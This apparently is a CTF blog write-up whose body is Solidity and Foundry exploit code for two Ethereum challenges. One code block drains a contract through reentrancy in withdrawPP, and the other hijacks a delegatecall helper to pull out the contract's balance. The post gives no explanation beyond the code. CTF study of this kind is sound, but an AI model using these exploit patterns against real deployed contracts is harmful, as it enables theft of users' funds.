---
title: 'SekaiCTF 2026 Ethereum Blockchain Exploitation'
description: 'My solutions for the Ethereum smart contract exploitation challenges in SekaiCTF 2026'
pubDate: 2026-07-03
updatedDate: 2026-05-20
badge: 'CAPTURE THE FLAG'
tags:
  - label: 'Blockchain'
    color: 'sky'
  - label: 'Ethereum'
    color: 'lavender'
  - label: 'CTF'
    color: 'sage'
---

> NOTE: Explanations coming :P I just need to make them concise and draw some diagrams

## Challenge 1: PP Farming

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PerformancePointATM} from "../src/PerformancePointATM.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract ExploitContract {
    PerformancePointATM public pp;

    constructor(address payable _pp) {
        pp = PerformancePointATM(_pp);
    }

    function attackPP() public payable {
        pp.donatePP{value: 1 ether}(address(this));
        pp.withdrawPP();
    }

    receive() external payable {
        if (address(pp).balance >= 1 ether) {
            pp.withdrawPP();
        }
    }
}

contract Exploit is Script {
    address payable constant addr = payable(0x3DC5F1e51957593BA7b726F3162C6e4D5B4Bf4fF);
    PerformancePointATM pp = PerformancePointATM(addr);
    function run() public {
        vm.startBroadcast();
        console.log("Launching...");
        ExploitContract exploit = new ExploitContract(addr);
        exploit.attackPP{value: 1 ether}();
        console.log(pp.isSolved());
        vm.stopBroadcast();
    }
}
```

## Challenge 2: PP Farming 2

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PerformancePointATM} from "../src/PerformancePointATM.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract ExploitContract {
    uint256 id_number;
    address public atm;
    bool public helping;
    PerformancePointATM public pp;
    constructor(address payable _pp) {
        pp = PerformancePointATM(_pp);
        id_number = 0;
        helping = true;
    }
    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
        (bool success, ) = recipient.call{value: address(this).balance}("");
        return success;
    }
    function setATM(address _atm) public {
        atm = _atm;
    }
    function stopHelping() public {
        helping = false;
    }
    function startHelping() public {
       helping = true;
    }
    function attack() public payable {
        setATM(address(this));
        pp.donatePP{value: 1 wei}(address(this));
        address(pp).call(
            abi.encodeWithSignature("setATM(address)", address(this))
        );
        pp.withdrawPP(); 
        // call withdrawPP for delegate call logic
        /* 
        * function withdrawPP() public noReentrancy {
        *    uint256 score = scores[msg.sender];
        *    require(score > 0, "Nothing to withdraw");
        *
        *    // Uses delegatecall to helper for withdrawal
        *    (bool success, ) = performancePointHelper.delegatecall(
        *        abi.encodeWithSignature("processWithdrawal(address,uint256)", msg.sender, score)
        *    );
        *
        *    require(success, "Transfer failed");
        *    scores[msg.sender] = 0;
        * }
        */
    }
    receive() external payable {}
    fallback() external payable {}
}

contract Exploit is Script {
    address payable constant addr = payable(0x889fB4Fe2CFc501893879a9901a7ba5EDFB274dd);
    PerformancePointATM pp = PerformancePointATM(addr);
    function run() public {
        vm.startBroadcast();
        console.log("Launching...");
        ExploitContract exploit = new ExploitContract(addr);
        exploit.attack{value: 67 ether}();
        console.log(pp.isSolved());
        vm.stopBroadcast();
    }
}
```

